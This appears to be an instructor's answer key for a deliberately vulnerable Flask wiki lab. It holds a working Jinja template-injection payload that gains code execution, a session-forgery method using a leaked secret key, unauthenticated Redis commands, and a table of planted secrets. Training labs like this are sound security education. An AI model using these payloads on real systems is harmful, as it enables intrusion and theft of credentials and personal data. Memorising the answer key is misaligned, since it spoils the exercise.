# Solution — 03 Nebula Wiki (easy)

> Spoilers — instructor's answer key.

## Surface

Three hosts on `203.0.113.0/24`: the Flask wiki (`.20`, web 8103), an **unauthenticated
Redis** (`.10`, 6379/8203), and Postgres (`.30`, 5432/8303). The wiki exposes `/`,
`/page/<slug>`, `/preview`, `/debug`, `/admin`.

## Intended vectors (three independent paths to the loot)

1. **SSTI → RCE** — `/preview` renders the `content` field as a Jinja template:
   ```sh
   curl -s 'http://127.0.0.1:8103/preview' --data-urlencode \
     "content={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
   ```
   From code execution, read the environment (`PG_PASS`, `SECRET_KEY`), then dump Postgres
   (employees + the runbook's SSH key).
2. **Debug route → session forgery** — `GET /debug` leaks `SECRET_KEY=nebula-flask-key-7f3a`.
   Sign a cookie with `role=admin` (e.g. with `flask-unsign` or the itsdangerous API) and
   `GET /admin` returns the **employee export**.
3. **Unauthenticated Redis** — `redis-cli -h 127.0.0.1 -p 8203 KEYS '*'` then
   `GET secret:smtp` reveals cached **SMTP relay credentials**.

The **SSH deploy key** lives in the `infra-runbook` wiki page (`/page/infra-runbook`, or via
the Postgres dump); it points at `files.nebula.lab` and would enable lateral movement.

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `flask-secret-key` | `nebula-flask-key-7f3a` | `GET /debug` |
| `deploy-ssh-key` | OpenSSH private key | `page infra-runbook` / Postgres `pages` |
| `employee-pii` | `l.fowler@nebula.example`, salaries, SSNs | Postgres `employees` (via RCE/creds) |
| `smtp-secret` | `…N3bula-Mail-2024!` | Redis key `secret:smtp` |

## Reset

`make lab-restore LAB=03-easy-nebula-wiki` (recreate — drops the Postgres volume, re-seeds;
Redis is re-warmed by the app at boot).
